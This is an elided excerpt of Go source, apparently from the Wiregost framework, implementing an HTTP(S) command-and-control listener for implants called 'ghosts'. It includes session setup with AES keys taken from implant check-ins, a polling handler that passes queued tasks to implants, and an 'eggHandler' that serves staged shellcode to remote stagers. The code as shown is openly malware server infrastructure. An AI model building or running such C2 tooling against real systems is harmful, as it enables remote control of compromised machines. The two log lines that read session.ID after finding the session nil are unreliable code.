...
import (
	...
	"github.com/maxlandon/wiregost/server/cryptography"
	wiregostHandlers "github.com/maxlandon/wiregost/server/handlers"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/website"
)

var (
	httpLog   = log.ServerLogger("c2", "http")
	accessLog = log.ServerLogger("c2", "http-access")
)
...
// HTTPSession - Holds data related to a ghost c2 session
...
// GhostHTTPC2 - Holds refs to all the C2 objects
type GhostHTTPC2 struct {
	HTTPServer     *http.Server
	Conf           *HTTPServerConfig
	Sessions       *httpSessions
	GhostShellcode []byte // Ghost shellcode to serve during staging process
	Cleanup        func()
}

// StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
// HTTP/HTTPS depending on the caller's conf
func StartHTTPSListener(conf *HTTPServerConfig) *GhostHTTPC2 {
...
func (s *GhostHTTPC2) router() *mux.Router {
...
func (s *GhostHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *GhostHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *GhostHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	...
	sessionInit := &ghostpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	session := newSession()
	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	checkin := time.Now()
	session.Ghost = &core.Ghost{
		ID:            core.GetGhostWireID(),
		Transport:     "http(s)",
		RemoteAddress: req.RemoteAddr,
		Send:          make(chan *ghostpb.Envelope, 16),
...
func (s *GhostHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
	...
	handlers := wiregostHandlers.GetGhostHandlers()
	if envelope.ID != 0 {
		session.Ghost.RespMutex.RLock()
		defer session.Ghost.RespMutex.RUnlock()
		if resp, ok := session.Ghost.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler.(func(*core.Ghost, []byte))(session.Ghost, envelope.Data)
	}
	resp.WriteHeader(200)
	// TODO: Return random data?
}

func (s *GhostHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		httpLog.Infof("No session with id %#v", session.ID)
		resp.WriteHeader(403)
	...
	select {
	case envelope := <-session.Ghost.Send:
		resp.WriteHeader(200)
...
func (s *GhostHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		httpLog.Infof("No session with id %#v", session.ID)
		resp.WriteHeader(403)
	...
	core.Wire.RemoveGhost(session.Ghost)
...
// eggHandler - Serves the ghost shellcode to the egg requesting it
func (s *GhostHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Received egg request from %s", req.RemoteAddr)
	resp.Write(s.GhostShellcode)
	httpLog.Infof("Serving ghost shellcode (size %d) to %s", len(s.GhostShellcode), req.RemoteAddr)
	resp.WriteHeader(200)
}

func (s *GhostHTTPC2) getSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		if cookie.Name == sessionCookieName {
			session := s.Sessions.Get(cookie.Value)
			if session != nil {
				checkin := time.Now()
				session.Ghost.LastCheckin = &checkin
				return session
			}
			return nil
		}
